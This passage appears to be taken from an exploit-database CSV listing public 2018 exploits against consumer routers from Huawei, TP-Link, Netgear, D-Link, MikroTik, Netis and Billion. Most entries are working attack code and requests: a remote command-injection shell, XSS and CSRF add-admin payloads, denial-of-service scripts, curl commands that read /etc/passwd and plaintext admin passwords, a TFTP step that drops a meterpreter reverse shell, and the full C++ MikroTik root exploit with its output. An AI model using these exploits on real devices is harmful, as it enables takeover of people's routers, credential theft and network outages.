global DEFAULT_HEADERS, DEFAULT_TIMEOUT
request = urllib2.Request(url, headers=DEFAULT_HEADERS)
data = urllib2.urlopen(request, timeout=DEFAULT_TIMEOUT).read()
return data
def exploit(ip, path):
url = ""http://%s:37215/icon/../../../%s"" % (ip, path)
data = fetch_url(url)
return data
def main():
pwd = ""/""
cmd_path = ""/tmp/ccmd""
pwd_path = ""/tmp/cpwd""
while True:
targetip = sys.argv[1]
cmd_ = raw_input(""[{}]$ "".format(pwd))
cmd = ""cd {} ; {} > {} ; pwd > {}"".format(pwd,cmd_.split(""|"")[0],cmd_path,pwd_path)
rm = ""<?xml version=\""1.0\"" ?>\n    <s:Envelope xmlns:s=\""http://schemas.xmlsoap.org/soap/envelope/\"" s:encodingStyle=\""http://schemas.xmlsoap.org/soap/encoding/\"">\n    <s:Body><u:Upgrade xmlns:u=\""urn:schemas-upnp-org:service:WANPPPConnection:1\"">\n    <NewStatusURL>$("" + cmd + "")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>""
url = ""http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1""
requests.post(url, auth=HTTPDigestAuth('dslf-config', 'admin'), data=rm)
assert cmd_path.startswith(""/""), ""An absolute path is required""
data = exploit(targetip, cmd_path)
open(cmd_path,""wb"").write(data)
if ""cd"" in cmd_:
pass
elif ""clear"" in cmd_:
os.system(""clear"")
elif ""cat"" in cmd_:
os.system(cmd_.replace(cmd_.split(""cat"")[1].split("" "")[1],cmd_path))
else:
if ""|"" in cmd_:
os.system(""cat {} | {}"".format(cmd_path,cmd_.split(""|"")[1]))
else:
os.system(""cat {}"".format(cmd_path))
pwd = exploit(targetip,pwd_path).strip(""\n"")
if __name__ == ""__main__"":
main()"
2018-12-11,WebApps,Hardware,Usman Saeed,TP-Link wireless router Archer C1200,Cross-Site Scripting,http://hostname/webpages/data/_._.<img src=a onerror=alert(“Reflected-XSS”)>../..%2f,"[+] Unauthenticated
[+] Author: Usman Saeed (usman [at] xc0re.net)
[+] Affected Version: Firmware version: 1.13 Build 2018/01/24 rel.52299 EU
[·] Impact: Client side attacks are very common and are the source of maximum number of user compromises. With this attack, the threat actor can steal cookies, redirect an innocent victim to a malicious website, thus compromising the user.
[·] Reason: The remote webserver does not filter special characters or illegal input.
[+] Attack type: Remote
[+] Patch Status: Unpatched
[+] Exploitation:
[!] The Cross-site scripting vector can be executed, as illustrated below"
2018-11-12,WebApps,Hardware,Wadeek,TP-Link Archer C50 Wireless Router 171227,Cross-Site Request Forgery (Configuration File Disclosure),"# Exploit Title: TP-Link Archer C50 Wireless Router 171227 - Cross-Site Request Forgery (Configuration File Disclosure)
# Date: 2018-11-07
# Exploit Author: Wadeek
# Vendor Homepage: https://www.tp-link.com/
# Hardware Version: Archer C50 v3 00000001
# Firmware Link: https://www.tp-link.com/download/Archer-C50_V3.html#Firmware
# Firmware Version: <= Build 171227
# require HTTP Proxy (chunk error)
#puts(payload)","url = ""http://192.168.0.1:80/""
require('base64')
require('openssl')
require('mechanize')
agent = Mechanize.new()
agent.set_proxy(""127.0.0.1"", ""8080"")
def scan(agent, url, path, query)
begin
puts(path)
response = agent.post(url+path, query, {
""User-Agent"" => """",
""Accept"" => ""*/*"",
""Referer"" => ""http://192.168.0.1/mainFrame.htm"",
""Content-Type"" => ""text/plain"",
""Connection"" => ""keep-alive"",
""Cookie"" => """"
rescue Exception => e
begin
puts(e.inspect())
body = e.page().body()
content = Base64.decode64(body.scan(/ZAP Error \[java\.io\.IOException\]\: Bad chunk size\: (.*)/).join())
puts(body.inspect())
cipher = OpenSSL::Cipher.new(""des-ecb"")
cipher.key = ""478DA50BF9E3D2CF""
cipher.decrypt()
output = cipher.update(content)
file = File.open(""conf.bin.raw"", ""wb"")
file.write(output)
file.close()
rescue Exception => e
puts(e)
end
puts("""")
end
end
payload = ""\x5b\x49\x47\x44\x5f\x44\x45\x56\x5f\x49\x4e\x46\x4f\x23\x30""+
""\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x23\x30\x2c\x30\x2c""+
""\x30\x2c\x30\x2c\x30\x2c\x30\x5d\x30\x2c\x34\xd\xa\x6d\x6f\x64""+
""\x65\x6c\x4e\x61\x6d\x65\xd\xa\x64\x65\x73\x63\x72\x69\x70\x74""+
""\x69\x6f\x6e\xd\xa\x58\x5f\x54\x50\x5f\x69\x73\x46\x44\xd\xa\x58""+
""\x5f\x54\x50\x5f\x50\x72\x6f\x64\x75\x63\x74\x56\x65\x72\x73\x69""+
""\x6f\x6e\xd\xa\x5b\x45\x54\x48\x5f\x53\x57\x49\x54\x43\x48\x23\x30""+
""\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x23\x30\x2c\x30\x2c\x30\x2c""+
""\x30\x2c\x30\x2c\x30\x5d\x31\x2c\x31\xd\xa\x6e\x75\x6d\x62\x65\x72""+
""\x4f\x66\x56\x69\x72\x74\x75\x61\x6c\x50\x6f\x72\x74\x73\xd\xa\x5b""+
""\x53\x59\x53\x5f\x4d\x4f\x44\x45\x23\x30\x2c\x30\x2c\x30\x2c\x30\x2c""+
""\x30\x2c\x30\x23\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x5d\x32""+
""\x2c\x31\xd\xa\x6d\x6f\x64\x65\xd\xa\x5b\x2f\x63\x67\x69\x2f\x63\x6f""+
""\x6e\x66\x65\x6e\x63\x6f\x64\x65\x23\x30\x2c\x30\x2c\x30\x2c\x30""+
""\x2c\x30\x2c\x30\x23\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30""+
""\x5d\x33\x2c\x30\xd\xa\x3d""
scan(agent, url, ""cgi?1&1&1&8"", payload)"
2018-11-05,DoS,Hardware,Ross Inman,Virgin Media Hub 3.0 Router,Denial of Service (PoC),"# Exploit Title: Virgin Media Hub 3.0 Router - Denial of Service (PoC)
# Google Dork: N/A
# Date: 2018-11-03
# Exploit Author: Ross Inman
# Vendor Homepage: https://www.broadbandchoices.co.uk/guides/hardware/virgin-media-broadband-routers
# Software Link: N/A
# Version: Virgin Media Hub 3.0
# Tested on: Linux
# CVE : N/A
#!/usr/bin/python2.7","import socket, sys, random, os
user_agents = [
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393""
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"",
""Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"",
""Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"",
""Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"",
""Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"",
""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"",
def connection(ip,port):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(1)
test = s.connect_ex((ip,port))
s.close()
if(test == 0):
return True
else:
return False
def dos(ip,port):
socks = []
payload = """"""
POST / HTTP/1.1\
Host: {}
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: {}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
"""""".format(ip,random.choice(user_agents))
with open(""/tmp/payload.txt"",""w"") as f:
f.write(payload)
f.close()
with open(""/tmp/payload.txt"",""r"") as f:
lines = f.readlines()
f.close()
os.remove(""/tmp/payload.txt"")
while(True):
try:
sys.stdout.write(""\r[Info]Sending packets => {}"".format(ip))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
for line in lines:
s.send(line)
socks.append(s)
except KeyboardInterrupt:
print""\n[Info]Closing connections...""
for sock in socks:
sock.close()
socks.remove(sock)
sys.exit(0)
def main():
if(len(sys.argv) != 3):
sys.exit(""Usage: ./dos.py {target ip} {port}"")
else:
target = sys.argv[1]
port = int(sys.argv[2])
print""[Info]Checking connection to target...""
check = connection(target,port)
if(not check):
sys.exit(""[Failure]Connection to target failed."")
print""[Info]Starting attack on: {}"".format(target)
dos(target,port)
if(__name__ == ""__main__""):
main()"
2018-10-30,WebApps,Hardware,Wadeek,Netgear WiFi Router R6120,Credential Disclosure,"# Exploit Title: NETGEAR WiFi Router R6120 - Credential Disclosure
# Date: 2018-10-28
# Exploit Author: Wadeek
# Hardware Version: R6120
# Firmware Version: 1.0.0.30
# Vendor Homepage: https://www.netgear.com/support/product/R6120.aspx
# Firmware Link: http://www.downloads.netgear.com/files/GDC/R6120/R6120-V1.0.0.30.zip
# == Files Containing Juicy Info ==
# == Security Questions Bypass > Password Disclosure ==
# == Authenticated Telnet Command Execution ==",">> http://192.168.1.1:56688/rootDesc.xml (Server:  Unspecified, UPnP/1.0, Unspecified)
<serialNumber>SSSSSSSNNNNNN</serialNumber>
>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)
<POST REQUEST>
htpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)
(replace)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=
(by)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=passwordrecovered.htm&SID=
<POST RESPONSE>
"">You have successfully recovered the admin password.</span>
"">Router Admin Username</span>:&nbsp;admin</td>
"">Router Admin Password</span>:&nbsp;Str0ng+-Passw0rd</td>
>> http://admin:Str0ng+-Passw0rd@192.168.1.1/setup.cgi?todo=debug
:~$ telnet 192.168.1.1
R6120 login: admin
Password: Str0ng+-Passw0rd
upload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]
download by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]"
2018-10-12,WebApps,Hardware,Blazej Adamczyk,D-Link Routers,Directory Traversal,Description: Directory traversal vulnerability in the web interface on D-Link routers:,"Directory Traversal
CVE: CVE-2018-10822
CVSS v3: 8.6
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
DWR-116 through 1.06,
DIR-140L through 1.02,
DIR-640L through 1.02,
DWR-512 through 2.02,
DWR-712 through 2.02,
DWR-912 through 2.02,
DWR-921 through 2.02,
DWR-111 through 1.01,
and probably others with the same type of firmware
allows remote attackers to read arbitrary files via a /.. or // after “GET /uir” in an HTTP request.
NOTE: this vulnerability exists because of an incorrect fix for CVE-2017-6190.
PoC:
`$ curl http://routerip/uir//etc/passwd`
The vulnerability can be used retrieve administrative password using the other disclosed vulnerability - CVE-2018-10824.
This vulnerability was reported previously by Patryk Bogdan in CVE-2017-6190 but he reported it is fixed in certain release but unfortunately it is still present in even newer releases. The vulnerability is also present in other D-Link routers and can be exploited not only (as the original author stated) by double dot but also absolutely using double slash."
2018-10-12,WebApps,Hardware,Blazej Adamczyk,D-Link Routers,Plaintext Password,"## Password stored in plaintext
Description:","CVE: CVE-2018-10824
An issue was discovered on D-Link routers:
DWR-116 through 1.06,
DIR-140L through 1.02,
DIR-640L through 1.02,
DWR-512 through 2.02,
DWR-712 through 2.02,
DWR-912 through 2.02,
DWR-921 through 2.02,
DWR-111 through 1.01,
and probably others with the same type of firmware.
NOTE: I have changed the filename in description to XXX because the vendor leaves some EOL routers unpatched and the attack is too simple
The administrative password is stored in plaintext in the /tmp/XXX/0 file. An attacker having a directory traversal (or LFI) can easily get full router access.
PoC using the directory traversal vulnerability disclosed above - CVE-2018-10822
`$ curl http://routerip/uir//tmp/XXX/0`
This command returns a binary config file which contains admin username and password as well as many other router configuration settings. By using the directory traversal vulnerability it is possible to read the file without authentication."
2018-10-12,WebApps,Hardware,Blazej Adamczyk,D-Link Routers,Command Injection,"## Shell command injection
Description: An issue was discovered on D-Link routers:","CVE: CVE-2018-10823
CVSS v3: 9.1
AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
DWR-116 through 1.06,
DWR-512 through 2.02,
DWR-712 through 2.02,
DWR-912 through 2.02,
DWR-921 through 2.02,
DWR-111 through 1.01,
and probably others with the same type of firmware.
An authenticated attacker may execute arbitrary code by injecting the shell command into the chkisg.htm page Sip parameter. This allows for full control over the device internals.
PoC:
Login to the router.
Request the following URL after login:
`$ curl http://routerip/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd`
See the passwd file contents in the response."
2018-10-10,Remote,Hardware,Jacob Baines,MicroTik RouterOS < 6.43rc3,Remote Root,"# Exploit Title: RouterOS Remote Rooting
# Date: 10/07/2018
# Exploit Author: Jacob Baines
# Vendor Homepage: www.mikrotik.com
# Software Link: https://mikrotik.com/download
# Version: Longterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3
# Tested on: RouterOS Various
# CVE : CVE-2018-14847
https://blog.mikrotik.com/security/winbox-vulnerability.html
# Usage Example
# uname -a
# cat /rw/logs/VERSION
# Connection closed by foreign host.
#include <sstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include ""winbox_session.hpp""
#include ""winbox_message.hpp""
#include ""md5.hpp""
// the dat file is a series of nv::messages preceded by a two byte length
// this is mild insanity but the .dat file messages don't line
// up properly if a new user is added or whatever.
// we need an active admin account
// 0x2 has three groups: 1 (read), 2 (write), 3 (full)
// a null terminator! We did it.
// step one - do the file disclosure
// step two - parse the password
// step three - create the file","By the Way is an exploit coded in C++ that enables a root shell on Mikrotik devices running RouterOS versions:
Longterm: 6.30.1 - 6.40.7
Stable: 6.29 - 6.42
Beta: 6.29rc1 - 6.43rc3
The exploit can be found here: https://github.com/tenable/routeros/tree/master/poc/bytheway
The exploit leverages the path traversal vulnerability CVE-2018-14847 to extract the admin password and create an ""option"" package to enable the developer backdoor. Post exploitation the attacker can connect to Telnet or SSH using the root user ""devel"" with the admin's password.
Mikrotik patched CVE-2018-14847 back in April. However, until this PoC was written, I don't believe its been publicly disclosed that the attack can be levegered to write files. You can find Mikrotik's advisory here:
Note that, while this exploit is written for Winbox, it could be ported to HTTP as long as you had prior knowledge of the admin credentials.
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ telnet -l devel 192.168.1.251
Trying 192.168.1.251...
Connected to 192.168.1.251.
Escape character is '^]'.
Password:
Login failed, incorrect username or password
Connection closed by foreign host.
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ ./btw -i 192.168.1.251
╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬
╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘
╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴
[+] Extracting passwords from 192.168.1.251:8291
[+] Searching for administrator credentials
[+] Using credentials - admin:lol
[+] Creating /pckg/option on 192.168.1.251:8291
[+] Creating /flash/nova/etc/devel-login on 192.168.1.251:8291
[+] There's a light on
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ telnet -l devel 192.168.1.251
Trying 192.168.1.251...
Connected to 192.168.1.251.
Escape character is '^]'.
Password:
BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.
Linux MikroTik 3.3.5 #1 Thu Mar 2 08:16:25 UTC 2017 mips unknown
v6.38.4 Mar/08/2017 09:26:17
namespace
const char s_version[] = ""By the Way 1.0.0"";
* Parses the command line arguments. The program will always use two
* parameters (ip and winbox port) but the port will default to 8291 if
* not present on the CLI
* \param[in] p_arg_count the number of arguments on the command line
* \param[in] p_arg_array the arguments passed on the command line
* \param[in,out] p_ip the ip address to connect to
* \param[in,out] p_winbox_port the winbox port to connect to
* \return true if we have valid ip and ports. false otherwise.
bool parseCommandLine(int p_arg_count, const char* p_arg_array[],
std::string& p_ip, std::string& p_winbox_port)
boost::program_options::options_description description(""options"");
description.add_options()
(""help,h"", ""A list of command line options"")
(""version,v"", ""Display version information"")
(""winbox-port,w"", boost::program_options::value<std::string>()->default_value(""8291""), ""The winbox port"")
(""ip,i"", boost::program_options::value<std::string>(), ""The ip to connect to"");
boost::program_options::variables_map argv_map;
try
boost::program_options::store(
boost::program_options::parse_command_line(
p_arg_count, p_arg_array, description), argv_map);
catch (const std::exception& e)
std::cerr << e.what() << ""\n"" << std::endl;
std::cerr << description << std::endl;
return false;
boost::program_options::notify(argv_map);
if (argv_map.empty() || argv_map.count(""help""))
std::cerr << description << std::endl;
return false;
if (argv_map.count(""version""))
std::cerr << ""Version: "" << ::s_version << std::endl;
return false;
if (argv_map.count(""ip"") && argv_map.count(""winbox-port""))
p_ip.assign(argv_map[""ip""].as<std::string>());
p_winbox_port.assign(argv_map[""winbox-port""].as<std::string>());
return true;
else
std::cerr << description << std::endl;
return false;
* This function uses the file disclosure vulnerability, CVE-2018-14847, to
* download the user database from /flash/rw/store/user.dat
* \param[in] p_ip the address of the router to connect to
* \param[in] p_winbox_port the winbox port to connect to
* \return a string containing the user.dat data or an empty string on error
std::string getPasswords(const std::string& p_ip, const std::string& p_winbox_port)
std::cout << ""[+] Extracting passwords from "" << p_ip << "":"" << p_winbox_port << std::endl;
Winbox_Session winboxSession(p_ip, p_winbox_port);
if (!winboxSession.connect())
std::cerr << ""[!] Failed to connect to the remote host"" << std::endl;
return std::string();
WinboxMessage msg;
msg.set_to(2, 2);
msg.set_command(7);
msg.set_request_id(1);
msg.set_reply_expected(true);
msg.add_string(1, ""//./.././.././../flash/rw/store/user.dat"");
winboxSession.send(msg);
msg.reset();
if (!winboxSession.receive(msg))
std::cerr << ""[!] Error receiving an open file response."" << std::endl;
return std::string();
boost::uint32_t sessionID = msg.get_session_id();
boost::uint16_t file_size = msg.get_u32(2);
if (file_size == 0)
std::cerr << ""[!] File size is 0"" << std::endl;
return std::string();
msg.reset();
msg.set_to(2, 2);
msg.set_command(4);
msg.set_request_id(2);
msg.set_reply_expected(true);
msg.set_session_id(sessionID);
msg.add_u32(2, file_size);
winboxSession.send(msg);
msg.reset();
if (!winboxSession.receive(msg))
std::cerr << ""[!] Error receiving a file content response."" << std::endl;
return std::string();
return msg.get_raw(0x03);
* Looks through the user.dat file for an enabled administrative account that
* we can use. Once a useful account is found the password is decrypted.
* \param[in] p_user_dat the user.dat file data
* \param[in,out] p_username stores the found admin username
* \param[in,out] p_password stores the found admin password
* \return true on success and false otherwrise
bool get_password(const std::string p_user_dat, std::string& p_username, std::string& p_password)
std::cout << ""[+] Searching for administrator credentials "" << std::endl;
std::string dat(p_user_dat);
while (dat.size() > 4)
boost::uint16_t length = *reinterpret_cast<const boost::uint16_t*>(&dat[0]);
if (dat[2] != 'M' || dat[3] != '2')
dat.erase(0, 1);
continue;
dat.erase(0, 4);
length -= 4;
if (length > dat.size())
return false;
std::string entry(dat.data(), length);
dat.erase(0, length);
WinboxMessage msg;
msg.parse_binary(entry);
if (msg.get_u32(2) == 3 && msg.get_boolean(0xfe000a) == false)
p_username.assign(msg.get_string(1));
std::string encrypted_pass(msg.get_string(0x11));
if (!encrypted_pass.empty() && msg.get_u32(0x1f) != 0)
std::string hash_this(p_username);
hash_this.append(""283i4jfkai3389"");
MD5 md5;
md5.update(hash_this.c_str(), hash_this.size());
md5.finalize();
std::string md5_hash(md5.getDigest());
for (std::size_t i = 0; i < encrypted_pass.size(); i++)
boost::uint8_t decrypted = encrypted_pass[i] ^ md5_hash[i % md5_hash.size()];
if (decrypted == 0)
return true;
p_password.push_back(decrypted);
p_password.clear();
return false;
* This function creates the file /pckg/option on the target. This will enable
* the developer login on Telnet and SSH. Oddly, you'll first need to log in
* to Telnet for SSH to work, but I digress...
* \param[in] p_ip the ip address of the router
* \param[in] p_port the port of the jsproxy we'll connect to
* \param[in] p_username the username we'll authenticate with
* \param[in] p_password the password we'll authenticate with
* \return true if we successfully created the file.
bool create_file(const std::string& p_ip, const std::string& p_port,
const std::string& p_username, const std::string& p_password)
Winbox_Session mproxy_session(p_ip, p_port);
if (!mproxy_session.connect())
std::cerr << ""[-] Failed to connect to the remote host"" << std::endl;
return false;
boost::uint32_t p_session_id = 0;
if (!mproxy_session.login(p_username, p_password, p_session_id))
std::cerr << ""[-] Login failed."" << std::endl;
return false;
std::cout << ""[+] Creating /pckg/option on "" << p_ip << "":"" << p_port << std::endl;
WinboxMessage msg;
msg.set_to(2, 2);
msg.set_command(1);
msg.set_request_id(1);
msg.set_reply_expected(true);
msg.set_session_id(p_session_id);
msg.add_string(1, ""//./.././.././../pckg/option"");
mproxy_session.send(msg);
msg.reset();
mproxy_session.receive(msg);
if (msg.has_error())
std::cout << ""[-] "" << msg.get_error_string() << std::endl;
return false;
std::cout << ""[+] Creating /flash/nova/etc/devel-login on "" << p_ip << "":"" << p_port << std::endl;
msg.reset();
msg.set_to(2, 2);
msg.set_command(1);
msg.set_request_id(2);
msg.set_reply_expected(true);
msg.set_session_id(p_session_id);
msg.add_string(1, ""//./.././.././../flash/nova/etc/devel-login"");
mproxy_session.send(msg);
msg.reset();
mproxy_session.receive(msg);
if (msg.has_error())
std::cout << ""[-] "" << msg.get_error_string() << std::endl;
return false;
return true;
int main(int p_argc, const char** p_argv)
std::string ip;
std::string winbox_port;
if (!parseCommandLine(p_argc, p_argv, ip, winbox_port))
return EXIT_FAILURE;
std::cout << std::endl;
std::cout << ""   ╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬"" << std::endl;
std::cout << ""   ╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘"" << std::endl;
std::cout << ""   ╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴ "" << std::endl;
std::cout << std::endl;
std::string user_dat(getPasswords(ip, winbox_port));
if (user_dat.empty())
return EXIT_FAILURE;
std::string admin_username;
std::string admin_password;
if (!get_password(user_dat, admin_username, admin_password))
std::cout << ""[-] Failed to find admin creds. Trying default."" << std::endl;
admin_username.assign(""admin"");
admin_password.assign("""");
std::cout << ""[+] Using credentials - "" << admin_username << "":"" << admin_password << std::endl;
if (!create_file(ip, winbox_port, admin_username, admin_password))
return EXIT_FAILURE;
std::cout << ""[+] There's a light on"" << std::endl;
return EXIT_SUCCESS;"
2018-10-05,WebApps,Hardware,cakes,Netis ADSL Router DL4322D RTK 2.1.1,Cross-Site Request Forgery (Add Admin),"# Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Cross-Site Request Forgery (Add Admin)
# Author: Cakes
# Discovery Date: 2018-10-01
# Vendor Homepage: http://www.netis-systems.com
# Software Link: http://www.netis-systems.com/Home/detail/id/74.html
# Tested Version: RTK 2.1.1
# Tested on OS: Kali Linux
# CVE: N/A
# Description
# Due to improper session management an attacker is able to add a administrator account
# without providing any authentication credentials.
# PoC 1
# PoC 2","POST /form2userconfig.cgi HTTP/1.1
Host: Target
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
username=Cakes&privilege=2&newpass=1234&confpass=1234&adduser=Add&hiddenpass=&submit.htm%3Fuserconfig.htm=Send
<html>
<body>
<form action=""http://Target/form2userconfig.cgi"" method=""POST"">
<input type=""hidden"" name=""username"" value=""Cakes"" />
<input type=""hidden"" name=""privilege"" value=""2"" />
<input type=""hidden"" name=""newpass"" value=""1234"" />
<input type=""hidden"" name=""confpass"" value=""1234"" />
<input type=""hidden"" name=""adduser"" value=""Add"" />
<input type=""hidden"" name=""hiddenpass"" value="""" />
<input type=""hidden"" name=""submit&#46;htm&#63;userconfig&#46;htm"" value=""Send"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2018-10-01,WebApps,Hardware,cakes,Billion ADSL Router 400G 20151105641,Cross-Site Scripting,"# Exploit Title: Billion ADSL Router 400G 20151105641 - Cross-Site Scripting
# Author: Cakes
# Discovery Date: 2018-09-30
# Vendor Homepage: http://www.billion.com
# Software Link: http://billionfirmware.co.za
# Tested Version: 20151105641
# Tested on OS: Kali Linux
# CVE: N/A
# Description:
# Improper input validation on the  router web interface allows attackers add a persistent
# Cross-Site scripting attack on the IP Interface field when adding a new static route.
# Simply intercept a new static route request and add in the XSS
# Poc","POST /configuration/edit-list.html HTTP/1.1
Host: Target
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://Target/configuration/edit-list.html
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
nodename=&destination=0.0.0.0&netmask=0.0.0.0&gateway=0.0.0.1&interface=<script>alert(""Cakes"");</script>&cost=1&action=create"
2018-09-17,DoS,Hardware,cakes,Netis ADSL Router DL4322D RTK 2.1.1,Denial of Service (PoC),"# Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Denial of Service (PoC)
# Author: Cakes
# Discovery Date: 2018-09-16
# Vendor Homepage: http://www.netis-systems.com
# Software Link: http://www.netis-systems.com/Home/detail/id/74.html
# Tested Version: RTK 2.1.1
# Tested on OS: Kali Linux
# CVE: N/A
# Description
# The FTP service is vulnerable to a Denial of Service attack. Attackers simply need to log
# into the router and send and valid FTP command with a character offset of 1461 as the command input","import socket
evil = '\x41'*1461
print ""\n[*] Netis ADSL Router DL4322D RTK 2.1.1 - Denial of Service (PoC)""
print ""\r[i] Creating socket""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ""\r[i] Connecting...""
connect = s.connect(('192.168.1.1',21))
s.recv(1024)
try:
s.send('USER guest\r\n')
s.recv(1024)
s.send('PASS guest\r\n')
s.recv(1024)
print ""\r[+] Connected""
except:
print ""\r[!] Credentials aren't working. Please change if none default""
print ""\r[+] Sending Payload""
try:
s.send('ABOR %s' % (evil))
print ""\r[+] Payload sent""
print ""\r[+] Router offline""
except:
print ""\r[!] Something went wrong""
s.close()"
2018-09-17,WebApps,Hardware,cakes,Netis ADSL Router DL4322D RTK 2.1.1,Cross-Site Scripting,"# Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Cross-Site Scripting
# Author: Cakes
